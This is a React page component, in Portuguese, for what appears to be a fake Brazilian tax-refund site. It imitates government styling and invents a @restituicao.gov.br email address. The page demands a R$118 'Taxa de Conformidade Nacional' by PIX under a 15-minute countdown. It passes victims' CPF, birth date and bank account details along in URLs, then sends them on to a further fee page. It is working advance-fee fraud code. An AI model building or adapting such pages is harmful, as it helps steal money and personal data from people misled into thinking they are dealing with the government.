import React, { useState, useEffect } from "react";
import { useLocation, useRoute, useRouter } from "wouter";
import { Button } from "@/components/ui/button";
import { Tabs, TabsList, TabsTrigger, TabsContent } from "@/components/ui/tabs";
import { AlertCircle, CheckCircle, ArrowRight, Loader } from "lucide-react";
import { useToast } from "@/hooks/use-toast";
import Header from "@/components/Header";
import Footer from "@/components/Footer";
import { LoadingPopup } from "@/components/LoadingPopup";
import { playNotificationSound } from "@/components/NotificationSound";

export default function PagamentoTCN() {
  const [, navigate] = useRouter();
  const [location] = useLocation();
  const { toast } = useToast();
  
  // Estados
  const [isLoading, setIsLoading] = useState(false);
  const [paymentInfo, setPaymentInfo] = useState<any>(null);
  const [codigoPix, setCodigoPix] = useState("");
  const [paymentStatus, setPaymentStatus] = useState("pending");
  const [verificandoStatus, setVerificandoStatus] = useState(false);
  const [tempoRestante, setTempoRestante] = useState(900); // 15 minutos em segundos
  
  // Extrair parâmetros da URL
  const urlParams = new URLSearchParams(window.location.search);
  const cpf = urlParams.get('cpf');
  const nome = urlParams.get('nome');
  const valor = urlParams.get('valor'); // Valor da restituição
  const valorTCN = urlParams.get('valorTCN') || "118.00"; // Valor da Taxa Complementar
  const companhia = urlParams.get('companhia');
  const estado = urlParams.get('estado');
  const dataNascimento = urlParams.get('nasc');
  const pagamentoIdOriginal = urlParams.get('pagamentoId');
  const dataPagamento = urlParams.get('dataPagamento');
  const email = urlParams.get('email') || `${cpf?.slice(0, 3)}xxx${cpf?.slice(-2)}@restituicao.gov.br`;
  const telefone = urlParams.get('telefone') || "(11) 9xxxx-xxxx";
  const agencia = urlParams.get('agencia');
  const conta = urlParams.get('conta');
  
  // Formatar valores
  const valorRestituicaoFormatado = new Intl.NumberFormat('pt-BR', { style: 'currency', currency: 'BRL' }).format(parseFloat(valor || "0"));
  const valorTaxaFormatado = new Intl.NumberFormat('pt-BR', { style: 'currency', currency: 'BRL' }).format(parseFloat(valorTCN));
  
  // Verificar se todos os parâmetros necessários estão presentes
  useEffect(() => {
    if (!cpf || !nome) {
      toast({
        title: "Dados incompletos",
        description: "Informações necessárias não encontradas. Redirecionando...",
        variant: "destructive"
      });
      // Redirecionar para a página inicial após 3 segundos
      setTimeout(() => {
        navigate("/");
      }, 3000);
    } else {
      // Se todos os dados estiverem presentes, criar pagamento
      criarPagamento();
    }
  }, [cpf, nome]);
  
  // Contagem regressiva
  useEffect(() => {
    if (tempoRestante <= 0) return;
    
    const timer = setInterval(() => {
      setTempoRestante(prev => prev - 1);
    }, 1000);
    
    return () => clearInterval(timer);
  }, [tempoRestante]);
  
  // Verificação periódica do status do pagamento
  useEffect(() => {
    if (!paymentInfo?.id || paymentStatus === "completed") return;
    
    const checkPaymentStatus = async () => {
      try {
        const response = await fetch(`/api/pagamentos/${paymentInfo.id}/status`);
        if (!response.ok) throw new Error('Falha ao verificar status do pagamento');
        
        const data = await response.json();
        
        if (data.status === 'PAID' || data.status === 'APPROVED' || data.status === 'COMPLETED') {
          setPaymentStatus("completed");
          playNotificationSound();
          toast({
            title: "Pagamento confirmado!",
            description: "Seu pagamento foi processado com sucesso. Redirecionando...",
            variant: "default"
          });
          
          // Preparar parâmetros para o redirecionamento
          const params = new URLSearchParams({
            cpf: cpf || "",
            nome: nome || "",
            valor: valor || "0",
            valorTCN: valorTCN,
            companhia: companhia || "",
            estado: estado || "",
            nasc: dataNascimento || "",
            pagamentoIdTCN: paymentInfo.id,
            pagamentoIdOriginal: pagamentoIdOriginal || "",
            dataPagamento: new Date().toISOString(),
            email: email || "",
            telefone: telefone || "",
            agencia: agencia || "",
            conta: conta || ""
          });
          
          // Redirecionar para a página de taxa LAR (última etapa)
          setTimeout(() => {
            navigate(`/taxa-lar?${params.toString()}`);
          }, 3000);
        }
      } catch (error) {
        console.error('Erro ao verificar status:', error);
      }
    };
    
    const interval = setInterval(checkPaymentStatus, 10000); // Verificar a cada 10 segundos
    return () => clearInterval(interval);
  }, [paymentInfo, paymentStatus]);
  
  // Função para verificar manualmente o status
  const verificarStatusManual = async () => {
    if (!paymentInfo?.id || verificandoStatus) return;
    
    setVerificandoStatus(true);
    try {
      const response = await fetch(`/api/pagamentos/${paymentInfo.id}/status`);
      if (!response.ok) throw new Error('Falha ao verificar status do pagamento');
      
      const data = await response.json();
      
      if (data.status === 'PAID' || data.status === 'APPROVED' || data.status === 'COMPLETED') {
        setPaymentStatus("completed");
        playNotificationSound();
        toast({
          title: "Pagamento confirmado!",
          description: "Seu pagamento foi processado com sucesso. Redirecionando...",
          variant: "default"
        });
        
        // Preparar parâmetros para o redirecionamento
        const params = new URLSearchParams({
          cpf: cpf || "",
          nome: nome || "",
          valor: valor || "0",
          valorTCN: valorTCN,
          companhia: companhia || "",
          estado: estado || "",
          nasc: dataNascimento || "",
          pagamentoIdTCN: paymentInfo.id,
          pagamentoIdOriginal: pagamentoIdOriginal || "",
          dataPagamento: new Date().toISOString(),
          email: email || "",
          telefone: telefone || "",
          agencia: agencia || "",
          conta: conta || ""
        });
        
        // Redirecionar para a página de taxa LAR (última etapa)
        setTimeout(() => {
          navigate(`/taxa-lar?${params.toString()}`);
        }, 3000);
      } else {
        toast({
          title: "Pagamento pendente",
          description: "Ainda não identificamos o seu pagamento. Por favor, verifique se você completou a transferência PIX.",
          variant: "default"
        });
      }
    } catch (error) {
      console.error('Erro ao verificar status:', error);
      toast({
        title: "Erro ao verificar pagamento",
        description: "Não foi possível verificar o status do seu pagamento. Tente novamente.",
        variant: "destructive"
      });
    } finally {
      setVerificandoStatus(false);
    }
  };
  
  // Formatar o tempo restante
  const formatarTempo = (segundos: number) => {
    const minutos = Math.floor(segundos / 60);
    const segundosRestantes = segundos % 60;
    return `${minutos.toString().padStart(2, '0')}:${segundosRestantes.toString().padStart(2, '0')}`;
  };
  
  // Criar pagamento PIX
  async function criarPagamento() {
    if (!cpf || !nome) {
      toast({
        title: "Dados incompletos",
        description: "CPF e nome são obrigatórios para gerar o pagamento.",
        variant: "destructive"
      });
      return;
    }
    
    try {
      setIsLoading(true);
      
      // Log dos dados para debug
      console.log("[PagamentoTCN] Criando pagamento com dados:", {
        cpf,
        nome,
        email,
        telefone
      });
      
      // Chamar a API para criar um pagamento
      const response = await fetch('/api/pagamentos', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json'
        },
        body: JSON.stringify({
          name: nome,
          cpf: cpf,
          email: email,
          phone: telefone,
          amount: parseFloat(valorTCN),
          taxType: 'tcn'
        })
      });

      if (!response.ok) {
        throw new Error('Falha ao gerar o pagamento');
      }

      const payment = await response.json();
      setPaymentInfo(payment);
      setCodigoPix(payment.pixCode);
      
      // Notificar o usuário
      toast({
        title: "Código PIX gerado",
        description: "Escaneie o QR Code ou copie o código PIX para fazer o pagamento.",
        variant: "default"
      });
      
    } catch (error) {
      console.error('Erro ao criar pagamento:', error);
      toast({
        title: "Erro ao gerar pagamento",
        description: "Não foi possível gerar o código PIX. Tente novamente.",
        variant: "destructive"
      });
    } finally {
      setIsLoading(false);
    }
  }
  
  // Copiar código PIX
  const copiarCodigoPix = () => {
    if (!codigoPix) return;
    
    navigator.clipboard.writeText(codigoPix)
      .then(() => {
        toast({
          title: "Código PIX copiado!",
          description: "O código PIX foi copiado para a área de transferência.",
          variant: "default"
        });
      })
      .catch((err) => {
        console.error('Erro ao copiar código:', err);
        toast({
          title: "Erro ao copiar",
          description: "Não foi possível copiar o código. Tente selecionar e copiar manualmente.",
          variant: "destructive"
        });
      });
  };

  return (
    <div className="min-h-screen flex flex-col">
      <Header />
      
      {paymentStatus === "completed" && (
        <LoadingPopup 
          message="Pagamento confirmado!" 
          subMessage="Você está sendo redirecionado..."
        />
      )}
      
      <main className="flex-grow bg-gray-50 py-8">
        <div className="container max-w-3xl mx-auto px-4">
          {/* Título da página */}
          <div className="mb-6">
            <h1 className="text-2xl font-bold text-[#071D41]">Pagamento da Taxa Complementar Nacional</h1>
            <p className="text-gray-600">Conclua o pagamento para reduzir o prazo de recebimento para 24h úteis.</p>
          </div>
          
          <div className="bg-white rounded-lg shadow-sm border border-gray-200 p-6 mb-8">
            <div className="grid md:grid-cols-5 gap-6">
              <div className="md:col-span-3 space-y-6">
                <div className="bg-[#F8FAFC] rounded-lg p-4 border border-gray-200">
                  <h2 className="font-semibold text-[#071D41] mb-3">Detalhes do Pagamento</h2>
                  
                  <div className="space-y-2">
                    <div className="flex justify-between py-2 border-b border-gray-200">
                      <span className="text-gray-600">Taxa:</span>
                      <span className="font-medium">Taxa de Conformidade Nacional (TCN)</span>
                    </div>
                    <div className="flex justify-between py-2 border-b border-gray-200">
                      <span className="text-gray-600">Valor:</span>
                      <span className="font-bold text-[#1351B4]">{valorTaxaFormatado}</span>
                    </div>
                    <div className="flex justify-between py-2 border-b border-gray-200">
                      <span className="text-gray-600">Nome:</span>
                      <span className="font-medium">{nome}</span>
                    </div>
                    <div className="flex justify-between py-2 border-b border-gray-200">
                      <span className="text-gray-600">CPF:</span>
                      <span className="font-medium">{cpf}</span>
                    </div>
                    <div className="flex justify-between py-2">
                      <span className="text-gray-600">Restituição:</span>
                      <span className="font-medium text-green-600">{valorRestituicaoFormatado}</span>
                    </div>
                  </div>
                </div>
                
                {/* Simulação de pagamento - APENAS PARA TESTES */}
                <div className="bg-gradient-to-br from-purple-50 to-purple-100 rounded-lg shadow-sm p-4 border border-purple-200">
                  <div className="flex items-center mb-2">
                    <div className="w-8 h-8 bg-purple-500 rounded-full flex items-center justify-center mr-3">
                      <svg xmlns="http://www.w3.org/2000/svg" className="h-4 w-4 text-white" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                        <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M13 10V3L4 14h7v7l9-11h-7z" />
                      </svg>
                    </div>
                    <div>
                      <p className="text-xs font-medium text-purple-800 uppercase tracking-wide">Simulação de Pagamento</p>
                      <Button
                        onClick={() => {
                          if (!paymentInfo?.id) return;
                          
                          setPaymentStatus("completed");
                          toast({
                            title: "Pagamento simulado!",
                            description: "Simulando confirmação de pagamento. Redirecionando...",
                            variant: "default"
                          });
                          
                          // Preparar parâmetros para o redirecionamento
                          const params = new URLSearchParams({
                            cpf: cpf || "",
                            nome: nome || "",
                            valor: valor || "0",
                            valorTCN: valorTCN,
                            companhia: companhia || "",
                            estado: estado || "",
                            nasc: dataNascimento || "",
                            pagamentoIdTCN: paymentInfo.id,
                            pagamentoIdOriginal: pagamentoIdOriginal || "",
                            dataPagamento: new Date().toISOString(),
                            email: email || "",
                            telefone: telefone || "",
                            agencia: agencia || "",
                            conta: conta || ""
                          });
                          
                          // Redirecionar para a página de taxa LAR após simulação
                          setTimeout(() => {
                            console.log("[SIMULAÇÃO] Redirecionando para a página de taxa LAR");
                            navigate(`/taxa-lar?${params.toString()}`);
                          }, 1500);
                        }}
                        className="bg-purple-600 hover:bg-purple-700 text-white w-full mt-2"
                      >
                        SIMULAR CONFIRMAÇÃO DE PAGAMENTO
                      </Button>
                    </div>
                  </div>
                  <p className="text-xs text-purple-800 mt-2 pl-11">Clique para simular um pagamento bem-sucedido e ver o redirecionamento</p>
                </div>
                
                <div className="bg-gradient-to-br from-amber-50 to-amber-100 rounded-lg shadow-sm p-4 border border-amber-200">
                  <div className="flex items-center mb-2">
                    <div className="w-8 h-8 bg-amber-500 rounded-full flex items-center justify-center mr-3">
                      <svg xmlns="http://www.w3.org/2000/svg" className="h-4 w-4 text-white" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                        <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M12 8v4l3 3m6-3a9 9 0 11-18 0 9 9 0 0118 0z" />
                      </svg>
                    </div>
                    <div>
                      <p className="text-xs font-medium text-amber-800 uppercase tracking-wide">Prazo de pagamento</p>
                      <p className="font-bold text-amber-600 text-lg">{formatarTempo(tempoRestante)}</p>
                    </div>
                  </div>
                  <p className="text-xs text-amber-800 mt-2 pl-11 flex items-center">
                    <span className="inline-block w-2 h-2 bg-amber-500 rounded-full mr-1 animate-pulse"></span>
                    Tempo restante para pagamento
                  </p>
                </div>
              </div>
              
              <div className="md:col-span-2">
                <div className="bg-[#1351B4] text-white py-3 px-4 rounded-t-md font-semibold text-sm flex items-center">
                  <div className="bg-white/20 p-1.5 rounded-md mr-2">
                    <svg xmlns="http://www.w3.org/2000/svg" className="h-4 w-4" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                      <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z" />
                    </svg>
                  </div>
                  PAGAMENTO VIA PIX
                </div>
                <div className="border border-t-0 border-gray-200 rounded-b-md p-5 bg-white shadow-sm mb-6">
                  <div className="mb-5">
                    <div className="flex justify-center">
                      <Tabs defaultValue="qrcode" className="w-full">
                        <TabsList className="w-full mb-6 bg-gray-100 p-1 rounded-lg">
                          <TabsTrigger value="qrcode" className="flex-1 data-[state=active]:bg-[#1351B4] data-[state=active]:text-white rounded-md transition-all duration-300">
                            <div className="flex items-center justify-center gap-2 py-1">
                              <svg xmlns="http://www.w3.org/2000/svg" className="h-4 w-4" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M12 4v1m6 11h2m-6 0h-2v4m0-11v3m0 0h.01M12 12h4.01M16 20h4M4 12h4m12 0h.01M5 8h2a1 1 0 001-1V5a1 1 0 00-1-1H5a1 1 0 00-1 1v2a1 1 0 001 1zm12 0h2a1 1 0 001-1V5a1 1 0 00-1-1h-2a1 1 0 00-1 1v2a1 1 0 001 1zM5 20h2a1 1 0 001-1v-2a1 1 0 00-1-1H5a1 1 0 00-1 1v2a1 1 0 001 1z" />
                              </svg>
                              QR Code PIX
                            </div>
                          </TabsTrigger>
                          <TabsTrigger value="copiacola" className="flex-1 data-[state=active]:bg-[#1351B4] data-[state=active]:text-white rounded-md transition-all duration-300">
                            <div className="flex items-center justify-center gap-2 py-1">
                              <svg xmlns="http://www.w3.org/2000/svg" className="h-4 w-4" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M8 16H6a2 2 0 01-2-2V6a2 2 0 012-2h8a2 2 0 012 2v2m-6 12h8a2 2 0 002-2v-8a2 2 0 00-2-2h-8a2 2 0 00-2 2v8a2 2 0 002 2z" />
                              </svg>
                              Copia e Cola
                            </div>
                          </TabsTrigger>
                        </TabsList>
                        
                        <TabsContent value="qrcode" className="mt-2">
                          <div className="flex flex-col items-center justify-center">
                            {isLoading ? (
                              <div className="py-10 flex flex-col items-center justify-center space-y-3">
                                <div className="relative">
                                  <div className="w-16 h-16 border-4 border-[#1351B4] border-opacity-20 rounded-full"></div>
                                  <Loader className="h-16 w-16 text-[#1351B4] animate-spin absolute top-0" />
                                </div>
                                <p className="text-[#071D41] font-medium mt-3">Gerando código de pagamento...</p>
                              </div>
                            ) : !paymentInfo ? (
                              <div className="py-10 text-center space-y-4">
                                <div className="bg-red-50 rounded-full p-4 mx-auto w-20 h-20 flex items-center justify-center">
                                  <AlertCircle className="h-10 w-10 text-red-500" />
                                </div>
                                <p className="text-red-600 font-medium">Não foi possível gerar o código PIX</p>
                                <Button 
                                  onClick={criarPagamento} 
                                  className="bg-[#1351B4] hover:bg-[#0D47A1] transition-colors duration-300"
                                >
                                  Tentar Novamente
                                </Button>
                              </div>
                            ) : (
                              <div>
                                <div className="border-4 border-[#1351B4] rounded-lg p-4 mb-4 bg-white max-w-xs mx-auto">
                                  <div className="bg-[#F8F9FA] p-2 rounded-md mb-2 text-center">
                                    <p className="text-xs text-gray-500">Escaneie o QR Code</p>
                                  </div>
                                  <img 
                                    src={paymentInfo.pixQrCode}
                                    alt="QR Code do PIX" 
                                    className="w-full h-auto" 
                                  />
                                </div>
                                <p className="text-sm text-gray-600 text-center mb-4">Use a câmera do seu aplicativo bancário<br/>para escanear este QR Code</p>
                                
                                <div className="flex justify-center">
                                  <Button 
                                    onClick={verificarStatusManual}
                                    disabled={verificandoStatus}
                                    className="bg-green-600 hover:bg-green-700 w-full"
                                  >
                                    {verificandoStatus ? (
                                      <>
                                        <Loader className="mr-2 h-4 w-4 animate-spin" />
                                        Verificando...
                                      </>
                                    ) : (
                                      <>
                                        <CheckCircle className="mr-2 h-4 w-4" />
                                        Já fiz o pagamento
                                      </>
                                    )}
                                  </Button>
                                </div>
                              </div>
                            )}
                          </div>
                        </TabsContent>
                        
                        <TabsContent value="copiacola" className="mt-2">
                          <div>
                            {isLoading ? (
                              <div className="py-10 flex flex-col items-center justify-center space-y-3">
                                <div className="relative">
                                  <div className="w-16 h-16 border-4 border-[#1351B4] border-opacity-20 rounded-full"></div>
                                  <Loader className="h-16 w-16 text-[#1351B4] animate-spin absolute top-0" />
                                </div>
                                <p className="text-[#071D41] font-medium mt-3">Gerando código de pagamento...</p>
                              </div>
                            ) : !paymentInfo ? (
                              <div className="py-10 text-center space-y-4">
                                <div className="bg-red-50 rounded-full p-4 mx-auto w-20 h-20 flex items-center justify-center">
                                  <AlertCircle className="h-10 w-10 text-red-500" />
                                </div>
                                <p className="text-red-600 font-medium">Não foi possível gerar o código PIX</p>
                                <Button 
                                  onClick={criarPagamento} 
                                  className="bg-[#1351B4] hover:bg-[#0D47A1] transition-colors duration-300"
                                >
                                  Tentar Novamente
                                </Button>
                              </div>
                            ) : (
                              <div>
                                <div className="bg-gray-50 border border-gray-200 rounded-lg p-4 mb-4">
                                  <div className="flex justify-between items-center mb-2">
                                    <p className="text-sm font-medium text-gray-700">Código PIX</p>
                                    <Button
                                      variant="outline"
                                      size="sm"
                                      onClick={copiarCodigoPix}
                                      className="text-xs h-8 flex items-center"
                                    >
                                      <svg xmlns="http://www.w3.org/2000/svg" className="h-4 w-4 mr-1" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                                        <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M8 16H6a2 2 0 01-2-2V6a2 2 0 012-2h8a2 2 0 012 2v2m-6 12h8a2 2 0 002-2v-8a2 2 0 00-2-2h-8a2 2 0 00-2 2v8a2 2 0 002 2z" />
                                      </svg>
                                      Copiar
                                    </Button>
                                  </div>
                                  <div className="bg-white border border-gray-200 rounded-md p-3 break-all text-sm font-mono">
                                    {codigoPix}
                                  </div>
                                  <p className="text-xs text-gray-500 mt-2">
                                    Cole este código no app do seu banco na opção "PIX Copia e Cola"
                                  </p>
                                </div>
                                
                                <div className="bg-amber-50 border-l-4 border-amber-400 p-3 rounded-r-md shadow-sm">
                                  <div className="flex items-start">
                                    <div className="flex-shrink-0 mt-0.5">
                                      <AlertCircle className="h-5 w-5 text-amber-500" />
                                    </div>
                                    <div className="ml-3">
                                      <p className="text-sm text-amber-800">
                                        Após fazer o pagamento, clique no botão <span className="font-bold">"Já fiz o pagamento"</span> abaixo para verificar.
                                      </p>
                                    </div>
                                  </div>
                                </div>
                                
                                <div className="mt-4">
                                  <Button 
                                    onClick={verificarStatusManual}
                                    disabled={verificandoStatus}
                                    className="bg-green-600 hover:bg-green-700 w-full"
                                  >
                                    {verificandoStatus ? (
                                      <>
                                        <Loader className="mr-2 h-4 w-4 animate-spin" />
                                        Verificando...
                                      </>
                                    ) : (
                                      <>
                                        <CheckCircle className="mr-2 h-4 w-4" />
                                        Já fiz o pagamento
                                      </>
                                    )}
                                  </Button>
                                </div>
                              </div>
                            )}
                          </div>
                        </TabsContent>
                      </Tabs>
                    </div>
                  </div>
                </div>
                
                <div className="bg-blue-50 border border-blue-200 rounded-lg p-4">
                  <div className="flex items-start">
                    <div className="bg-blue-100 rounded-full p-2 text-blue-500 mt-0.5 mr-3 flex-shrink-0">
                      <svg xmlns="http://www.w3.org/2000/svg" className="h-4 w-4" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                        <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M13 16h-1v-4h-1m1-4h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z" />
                      </svg>
                    </div>
                    <div>
                      <p className="text-blue-800 font-medium text-sm">O que é a Taxa de Conformidade Nacional?</p>
                      <p className="text-sm text-blue-700 mt-1">
                        A TCN é uma taxa que permite o processamento prioritário da sua restituição, reduzindo o tempo de espera de 72h para apenas 24h úteis.
                      </p>
                    </div>
                  </div>
                </div>
              </div>
            </div>
          </div>
        </div>
      </main>
      
      <Footer />
    </div>
  );
}